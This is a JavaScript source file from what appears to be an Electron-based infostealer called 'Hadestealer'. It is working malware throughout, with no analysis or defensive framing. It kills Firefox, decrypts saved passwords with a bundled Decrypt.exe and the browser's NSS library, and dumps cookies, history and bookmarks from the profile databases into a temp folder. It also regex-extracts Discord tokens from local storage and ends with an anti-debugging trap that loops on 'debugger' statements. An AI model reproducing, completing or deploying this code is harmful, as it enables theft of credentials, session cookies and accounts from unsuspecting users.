'use strict';

const fs = require("fs");
const path = require("path");
const os = require("os");
const sqlite3 = require("sqlite3");
const child_process = require("child_process");
const processUtils = require("../utils/process");
const sender = require("../api/sender");
const electron = require("electron");

Object.defineProperty(exports, "__esModule", {
    value: true
});
exports.getFirefoxAllData = getFirefoxAllData;
exports.firefoxSteal = firefoxSteal;

async function getFirefoxAllData() {
    (0, processUtils.killFirefox)();

    const firefoxProfilesPath = path.join(process.env.APPDATA || "", "Mozilla", "Firefox", "Profiles");
    if (!fs.existsSync(firefoxProfilesPath)) {
        return;
    }

    const collectedData = {
        cookies: [],
        history: [],
        passwords: [],
        bookmarks: []
    };

    const profiles = fs.readdirSync(firefoxProfilesPath);
    const tempSavePath = path.join(os.tmpdir(), "Hadestealer", "All", "Firefox");

    if (!fs.existsSync(tempSavePath)) {
        fs.mkdirSync(tempSavePath, {
            recursive: true
        });
    }

    const nssLibPath = findFirefoxLibPath();

    for (const profile of profiles) {
        const profileFullDir = path.join(firefoxProfilesPath, profile);
        if (!fs.statSync(profileFullDir).isDirectory()) {
            continue;
        }

        const key4Path = path.join(profileFullDir, "key4.db");
        const loginsPath = path.join(profileFullDir, "logins.json");

        if (fs.existsSync(key4Path) && fs.existsSync(loginsPath)) {
            const decryptedPasswords = await decryptFirefoxPasswords(profileFullDir, nssLibPath);
            if (decryptedPasswords) {
                collectedData.passwords.push(decryptedPasswords);
            }
        }

        const cookiesDbPath = path.join(profileFullDir, "cookies.sqlite");
        if (fs.existsSync(cookiesDbPath)) {
            const tempCookiesCopy = createTempSqliteCopy(cookiesDbPath);
            const db = new sqlite3.Database(tempCookiesCopy);

            const rows = await new Promise(resolve => db.all("SELECT * FROM moz_cookies", (err, res) => resolve(res || [])));
            rows.forEach(row => {
                const secureStatus = row.isSecure ? "TRUE" : "FALSE";
                collectedData.cookies.push(row.host + "\tTRUE\t" + row.path + "\t" + secureStatus + "\t" + row.expiry + "\t" + row.name + "\t" + row.value);
            });

            await new Promise(resolve => db.close(() => resolve()));
            try {
                fs.unlinkSync(tempCookiesCopy);
            } catch (e) {}
        }

        const placesDbPath = path.join(profileFullDir, "places.sqlite");
        if (fs.existsSync(placesDbPath)) {
            const tempPlacesCopy = createTempSqliteCopy(placesDbPath);
            const db = new sqlite3.Database(tempPlacesCopy);

            const historyRows = await new Promise(resolve => db.all("SELECT url, title FROM moz_places LIMIT 100", (err, res) => resolve(res || [])));
            historyRows.forEach(row => collectedData.history.push(row.url + " | " + row.title));

            const bookmarkRows = await new Promise(resolve => db.all("SELECT b.title, p.url FROM moz_bookmarks b JOIN moz_places p ON b.fk = p.id WHERE b.type = 1", (err, res) => resolve(res || [])));
            bookmarkRows.forEach(row => collectedData.bookmarks.push(row.url + " | " + row.title));

            await new Promise(resolve => db.close(() => resolve()));
            try {
                fs.unlinkSync(tempPlacesCopy);
            } catch (e) {}
        }
    }

    saveCollectedDataToDisk(collectedData);
}

function findFirefoxLibPath() {
    const paths = [
        "C:\\Program Files\\Mozilla Firefox",
        "C:\\Program Files (x86)\\Mozilla Firefox",
        path.join(process.env.LOCALAPPDATA || "", "Mozilla Firefox")
    ];
    return paths.find(p => fs.existsSync(path.join(p, "nss3.dll"))) || "";
}

async function decryptFirefoxPasswords(profilePath, nssPath, retries = 3) {
    if (!profilePath || !nssPath) return null;

    const decryptExeName = "Decrypt.exe";
    const isPackaged = electron.app ? electron.app.isPackaged : process.env.NODE_ENV === "production";
    const decryptExePath = !isPackaged ?
        path.join(process.cwd(), "src", "lib", decryptExeName) :
        path.join(process.resourcesPath, "lib", decryptExeName);

    if (!fs.existsSync(decryptExePath)) {
        sender.sendGenericMessage("FF Decryptor bulunamadı: " + decryptExePath);
        return null;
    }

    for (let i = 0; i < retries; i++) {
        try {
            try {
                child_process.execSync("taskkill /F /IM " + decryptExeName + " /T", {
                    stdio: 'ignore'
                });
            } catch (e) {}

            const command = "\"" + decryptExePath + "\" \"" + profilePath + "\" \"" + nssPath + "\"";
            const output = child_process.execSync(command, {
                encoding: 'utf-8',
                timeout: 7000,
                windowsHide: true,
                maxBuffer: 1024 * 1024 * 5
            });

            if (output && output.trim()) return output.trim();
        } catch (err) {
            const isBusy = err.message.includes("EBUSY") || err.code === "EBUSY";
            if (i < retries - 1) {
                await new Promise(r => setTimeout(r, isBusy ? 2000 : 1000));
                continue;
            }
        }
    }
    sender.sendGenericMessage("Tüm denemeler başarısız oldu.");
    return null;
}

function saveCollectedDataToDisk(data) {
    const saveDir = path.join(os.tmpdir(), "Hadestealer", "All", "Firefox");
    if (!fs.existsSync(saveDir)) {
        fs.mkdirSync(saveDir, {
            recursive: true
        });
    }

    const encoding = "utf-8";
    if (data.passwords.length > 0) {
        fs.writeFileSync(path.join(saveDir, "Passwords.txt"), data.passwords.join("\n"), encoding);
    }
    if (data.cookies.length > 0) {
        fs.writeFileSync(path.join(saveDir, "Cookies.txt"), data.cookies.join("\n"), encoding);
    }
    if (data.history.length > 0) {
        fs.writeFileSync(path.join(saveDir, "History.txt"), data.history.join("\n"), encoding);
    }
    if (data.bookmarks.length > 0) {
        fs.writeFileSync(path.join(saveDir, "Bookmarks.txt"), data.bookmarks.join("\n"), encoding);
    }
}

function createTempSqliteCopy(originalPath) {
    const tempPath = path.join(os.tmpdir(), "temp_" + Math.random().toString(36).substring(7) + ".sqlite");
    fs.copyFileSync(originalPath, tempPath);
    return tempPath;
}

function firefoxSteal(profileRootDir, tag) {
    const tokens = [];
    try {
        const items = fs.readdirSync(profileRootDir, {
            withFileTypes: true
        });
        for (const item of items) {
            if (item.isDirectory()) {
                const storagePath = path.join(profileRootDir, item.name, "webappsstore.sqlite");
                if (fs.existsSync(storagePath)) {
                    try {
                        const db = new sqlite3.Database(storagePath, sqlite3.OPEN_READONLY);
                        db.all("SELECT key, value FROM webappsstore2 WHERE originKey LIKE '%discord%'", (err, rows) => {
                            if (!err && rows) {
                                rows.forEach(row => {
                                    const val = row.value;
                                    if (val && typeof val === "string") {
                                        const match = val.match(/[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}/g);
                                        if (match) {
                                            match.forEach(token => {
                                                if (!tokens.some(t => t[0] === token)) {
                                                    tokens.push([token, tag]);
                                                }
                                            });
                                        }
                                    }
                                });
                            }
                        });
                        db.close();
                    } catch (e) {}
                }
            }
        }
    } catch (e) {}
    return tokens;
}

(function antiDebug() {
    const check = function () {
        const trap = function () {
            const pattern = new RegExp("function *\\( *\\)");
            const increment = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
            const action = initAction("init");
            if (!pattern.test(action + "chain") || !increment.test(action + "input")) {
                action("0");
            } else {
                initAction();
            }
        };

        function initAction(param) {
            function debugTrap(n) {
                if (typeof n === "string") {
                    return function (m) {}.constructor("while (true) {}").apply("counter");
                } else if (("" + n / n).length !== 1 || n % 20 === 0) {
                    (function () {
                        return true;
                    }).constructor("debugger").call("action");
                } else {
                    (function () {
                        return false;
                    }).constructor("debugger").apply("stateObject");
                }
                debugTrap(++n);
            }
            try {
                if (param) return debugTrap;
                else debugTrap(0);
            } catch (e) {}
        }
        try {
            trap();
        } catch (e) {}
    };
    setInterval(check, 4000);
})();
